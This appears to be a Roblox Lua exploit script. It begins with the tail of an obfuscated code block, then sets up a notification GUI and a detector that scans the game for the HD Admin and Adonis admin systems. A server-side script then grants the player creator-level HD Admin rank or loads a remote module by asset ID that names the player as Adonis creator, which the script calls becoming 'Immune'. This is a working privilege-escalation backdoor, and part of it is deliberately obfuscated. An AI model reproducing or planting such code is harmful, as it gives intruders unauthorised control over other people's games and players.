X=I(-216099-(-194278))g=x i=c[X]y=i x=i and-482607+9825356 or 12013902-(-184358)end else X,k=g(i,X)x=X and-301801+13486716 or 286249+809976 end else if x<-695286+14896903 then F=F+b R=F<=B p=not G R=p and R p=F>=B p=G and p R=p or R p=-139044+6059481 x=R and p R=8153753-362923 x=x or R else x=true x=x and 117220+690228 or 7303487-(-466350)end end else if x<16704666-977982 then if x<14699919-(-520304)then if x<15651220-546545 then F=I(906428+-928249)R=c[F]x=c[I(-939659-(-917820))]F=I(314026+-335907)s=R[F]F=r[V[-976701-(-976702)]]R={s(F)}O={o(R)}else x=Q x=12549152-(-207718)O=n end else R=I(391148+-413003)O=654964+14369623 F=6101339-200870 s=R^F x=O-s O=I(-939569-(-917756))s=x x=O/s O={x}x=c[I(179727-201638)]end else if x<15516737-(-546417)then v=v+a Z=not C A=v<=u A=Z and A Z=v>=u Z=C and Z A=Z or A Z=188902+4367013 x=A and Z A=-514608+4039835 x=x or A else F=r[V[-38241+38247]]x=-991999+5540234 R=F==s O=R end end end end end end end x=#U return o(O)end return(b(10133974-(-42849),{}))(o(O))end)(getfenv and getfenv()or _ENV,unpack or table[I(-378208-(-356331))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
end
coroutine.wrap(KAHI_fake_script)()
local function KCJT_fake_script() -- Frame.ClientMain 
	local script = Instance.new('LocalScript', Frame)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local Notification = require(script.Parent.Notif)
	Notification.new()
	wait(7)
	Notification:PushNotification("Welcome back, ".. game.Players.LocalPlayer.Name)
	
end
coroutine.wrap(KCJT_fake_script)()
local function SEAPKGI_fake_script() -- Frame.Detector 
	local script = Instance.new('LocalScript', Frame)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	wait(3)
	local REAL = script.REAL
	local Notification = require(script.Parent.Notif)
	local ADMINS = {
	    ["Admins"] = {
	        ["HD Admin"] = false,
	        ["ADONIS"] = false
	    }
	}
	local function all_admins_detected()
	    for _, is_detected in pairs(ADMINS["Admins"]) do
	        if is_detected == false then
	            return false
	        else
	            return true
	        end
	    end
	end
	while all_admins_detected() == false do
	    for i, v in pairs(game:GetDescendants()) do
	        if v.Name == "HDAdminSetup" and v:IsA("ModuleScript") then
	            local admin_name = "HD Admin"
	            for _, admin in pairs(ADMINS["Admins"]) do
	                ADMINS["Admins"][admin_name] = true
	                Notification:PushNotification(admin_name .. " has been detected. You are now Immune.")
	                REAL:FireServer(admin_name)
	            end
	        end
	        if string.find(v.Name,"__ADONIS_LOCALCONTAINER") and v:IsA("Folder") then
	            local admin_name = "ADONIS"
	            for _, admin in pairs(ADMINS["Admins"]) do
	                ADMINS["Admins"][admin_name] = true
	                Notification:PushNotification(admin_name .. " has been detected. You are now Immune.")
	                REAL:FireServer(admin_name)
	            end
	        end
	    end
	    wait(1)
	end
	
end
coroutine.wrap(SEAPKGI_fake_script)()
local function WXSLN_fake_script() -- nil.Script 
	local script = Instance.new('Script', nil)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.REAL.OnServerEvent:Connect(function(plr, ADMIN)
	    if ADMIN == "ADONIS" then
	        wait(5)
	        local data = {};
	        data.Settings = {};
	        data.Settings.Creators = {plr.Name};
	        require(7510592873)(data);
	        data = nil;
	    elseif ADMIN == "HD Admin" then
	        wait(5)
	        _G.HDAdminMain:GetModule("cf"):SetRank(plr, game.CreatorId, 999999999999999, "Perm")
	    end
	end)
end
coroutine.wrap(WXSLN_fake_script)()
